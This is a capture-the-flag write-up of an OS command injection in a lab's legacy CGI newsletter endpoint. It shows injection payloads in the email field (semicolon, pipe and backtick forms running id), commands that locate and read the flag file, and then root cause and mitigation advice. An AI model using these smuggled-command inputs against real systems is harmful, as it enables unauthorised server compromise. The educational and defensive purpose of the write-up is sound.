---
title: "OS Command Injection – Remote Command Execution via Legacy CGI Endpoint | Slash & Sons"
date: 2026-05-23 23:15:00 +0530
categories: [A05 - Injection, OS Command Injection]
tags: [command-injection, rce, cgi, os-injection, legacy-systems, webversepro]
platform: WebVerse
author: Shivansh Sharma
image:
  path: /assets/images/posts/slash-and-sons.webp
  alt: Slash and Sons WebVerse challenge
---

# Lab Link

https://dashboard.webverselabs-pro.com/mystery-challenges/slash

# Overview

The **Slash & Sons** challenge demonstrates a classic **OS Command Injection** vulnerability inside a legacy CGI application.

The application contained an old-style CGI endpoint responsible for handling newsletter subscriptions. User input supplied to the endpoint was eventually passed into system-level commands without proper sanitization.

Because user input became part of an operating system command, arbitrary command execution became possible.

After confirming command execution, the vulnerability was leveraged to enumerate the filesystem and retrieve the flag.

# Objective

Identify the vulnerable CGI functionality, achieve command execution, and retrieve the flag.

# Vulnerability Classification Hierarchy

```text
OWASP Category
└── A05: Injection
    └── OS Command Injection
        └── CGI Command Injection
            └── Unsanitized User Input Passed to System Commands
```

# Reconnaissance

Initial exploration revealed a custom commission page:

```text
https://a1eac27d-4065-slash-38b38.events.webverselabs-pro.com/commission.html
```

Submitting a commission redirected requests toward:

```text
https://a1eac27d-4065-slash-38b38.events.webverselabs-pro.com/cgi-bin/inquiry.cgi
```

The presence of:

```text
/cgi-bin/
```

was interesting because older CGI applications frequently suffer from input handling issues.

Further exploration revealed newsletter subscription functionality.

Subscribing redirected to:

```text
/cgi-bin/newsletter.cgi
```

Request captured in Burp Suite:

```http
POST /cgi-bin/newsletter.cgi HTTP/2
Host: a1eac27d-4065-slash-38b38.events.webverselabs-pro.com

email=kelvin%40kel.com
```

At this point the CGI endpoint became the primary attack surface.

# Source Analysis

Reviewing page source revealed:

```html
<p class="nl-email">
<a href="/cdn-cgi/l/email-protection"
class="__cf_email__"
data-cfemail="90fbf5fce6f9fed0fbf5fcbef3fffd">
[email protected]
</a>
</p>
```

The application appeared to rely heavily on legacy CGI functionality.

Since CGI scripts commonly invoke shell commands internally, testing for command injection became worthwhile.

# Exploitation

Several payloads were tested:

```text
email=kelvin%40kel.com ; id

email=kelvin%40kel.com | id

email=kelvin%40kel.com && id

email=kelvin%40kel.com `id`
```

Most payloads failed.

The following payload succeeded:

```text
email=kelvin%40kel.com `id`
```

The application executed the command and rendered output within the response.

# Proof of Exploitation

Response:

```text
uid=33(www-data)
gid=33(www-data)
groups=33(www-data)
```

Successful execution confirmed:

- User input reached the shell
- Commands executed on the server
- Remote code execution was achieved

To locate the flag:

```text
`find / -iname "*flag.txt*" 2>/dev/null`
```

Response:

```text
/flag.txt
```

Read the file:

```text
`cat /flag.txt`
```

Response:

```text
WEBVERSE{.....}
```

The server executed arbitrary operating system commands.

# Root Cause

The application likely implemented logic similar to:

```bash
system("subscribe.sh " + email)
```

When input became:

```text
kelvin@kel.com `id`
```

the shell interpreted:

```bash
subscribe.sh kelvin@kel.com `id`
```

The shell first evaluated:

```bash
id
```

and inserted its output into the command.

Because user input was concatenated directly into operating system commands, attackers could inject arbitrary shell syntax.

# Impact

In real environments OS Command Injection can lead to:

- Remote code execution
- Sensitive file disclosure
- Credential theft
- Database compromise
- Internal network pivoting
- Container escape attempts
- Complete server takeover

Command injection frequently becomes one of the highest severity findings because it often results in direct system compromise.

# Mitigation

## Never construct shell commands using user input

Bad:

```php
system("subscribe.sh " . $_POST['email']);
```

Secure:

```php
exec(
    "/path/subscribe.sh",
    [$email]
);
```

or use APIs that avoid shell execution entirely.

## Validate user input

Allow only expected email patterns:

```regex
^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}$
```

Reject:

```text
`
;
|
&
$
()
```

and other shell metacharacters.

## Use parameterized execution methods

Prefer safe libraries rather than shell invocation.

## Run services with minimal privileges

Even if compromise occurs:

```text
www-data
```

should have limited permissions.

# Real-World Insight

Legacy CGI systems continue to appear during penetration tests involving:

- Internal tools
- Manufacturing systems
- Administrative portals
- Small business applications
- Older web infrastructure

A frequent developer assumption is:

```text
Only valid values reach this endpoint
```

Attackers do not use applications only through forms.

They directly manipulate requests and interact with the underlying application behavior.